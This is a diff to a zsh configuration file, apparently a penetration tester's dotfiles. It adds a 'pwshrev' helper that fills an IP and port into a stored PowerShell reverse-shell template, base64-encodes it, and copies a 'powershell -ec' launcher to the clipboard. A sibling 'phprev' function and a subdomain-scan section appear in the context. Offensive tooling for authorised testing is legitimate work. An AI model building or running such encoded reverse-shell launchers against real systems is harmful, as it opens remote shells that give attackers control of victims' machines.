@@ -121,6 +121,16 @@ phprev () {
   fi
 }
 
+pwshrev () {
+  if [ "$#" -ne 2 ]; 
+    then
+      echo "[i] Usage: pwshrev ip port"
+    else
+      SHELL=`cat ~/.zsh/revshells/pwshrev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
+      echo "powershell -ec $SHELL" | wl-copy
+  fi
+}
+
 # discovery
 subdomainscan() {
   if [ $# -eq 0 ]
